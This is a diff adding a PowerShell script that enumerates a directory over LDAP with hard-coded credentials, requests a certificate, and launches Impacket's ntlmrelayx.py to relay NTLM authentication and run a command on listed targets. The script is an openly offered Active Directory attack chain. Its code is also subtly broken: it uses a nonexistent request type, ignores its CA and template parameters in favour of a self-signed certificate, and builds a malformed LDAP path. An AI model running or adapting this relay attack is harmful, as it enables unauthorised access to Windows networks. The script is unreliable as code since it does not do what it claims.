@@ -1,0 +1,87 @@
+# PowerShell Script to Perform LDAP Queries and Request Certificates
+
+# Function to perform LDAP query and return results
+function Perform-LDAPQuery {
+    param(
+        [string]$ldapServer,
+        [string]$ldapUsername,
+        [string]$ldapPassword
+    )
+
+    try {
+        # Set up the LDAP connection
+        $ldapConnection = New-Object DirectoryServices.DirectorySearcher
+        $ldapConnection.Filter = "(objectClass=*)"
+        $ldapConnection.Properties.PropertyNames
+
+        # Bind to the server
+        $directoryEntry = New-Object DirectoryServices.DirectoryEntry("LDAP://$ldapServer", $ldapUsername, $ldapPassword)
+        $ldapConnection.SearchRoot = $directoryEntry
+        $ldapConnection.AuthenticationType = [System.DirectoryServices.AuthenticationTypes]::Secure
+
+        # Perform the LDAP query
+        $results = $ldapConnection.FindAll()
+
+        # Return the results of the query
+        $results | ForEach-Object {
+            $_.Properties
+        }
+    } catch {
+        Write-Host "Error in LDAP query: $_"
+    }
+}
+
+# Function to request a certificate
+function Request-Certificate {
+    param(
+        [string]$caServer,
+        [string]$certTemplate
+    )
+
+    try {
+        # Request a certificate from the CA
+        $certRequest = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509CertificateRequest
+        $cert = New-SelfSignedCertificate -CertStoreLocation "Cert:\LocalMachine\My" -DnsName "example.com"
+        Write-Host "Certificate requested successfully!"
+    } catch {
+        Write-Host "Error requesting certificate: $_"
+    }
+}
+
+# Function to perform a relay attack using ntlmrelayx.py (requires Impacket)
+function Perform-NTLMRelayAttack {
+    param(
+        [string]$targetFile,
+        [string]$command
+    )
+
+    try {
+        # Start the Impacket ntlmrelayx.py tool (make sure Impacket is installed)
+        $impacketPath = "C:\Path\to\impacket\ntlmrelayx.py"
+        Start-Process $impacketPath -ArgumentList "-tf $targetFile -c $command"
+    } catch {
+        Write-Host "Error in NTLM relay attack: $_"
+    }
+}
+
+# Main execution
+$ldapServer = "ldap://example.com"
+$ldapUsername = "username"
+$ldapPassword = "password"
+
+# Perform the LDAP query
+Write-Host "Performing LDAP query..."
+Perform-LDAPQuery -ldapServer $ldapServer -ldapUsername $ldapUsername -ldapPassword $ldapPassword
+
+# Request a certificate from the CA
+$caServer = "CA.example.com"
+$certTemplate = "WebServer"
+Write-Host "Requesting certificate..."
+Request-Certificate -caServer $caServer -certTemplate $certTemplate
+
+# Run NTLM relay attack (if you have the Impacket tools installed)
+$targetFile = "target.txt"
+$command = "whoami"
+Write-Host "Running NTLM relay attack..."
+Perform-NTLMRelayAttack -targetFile $targetFile -command $command
+
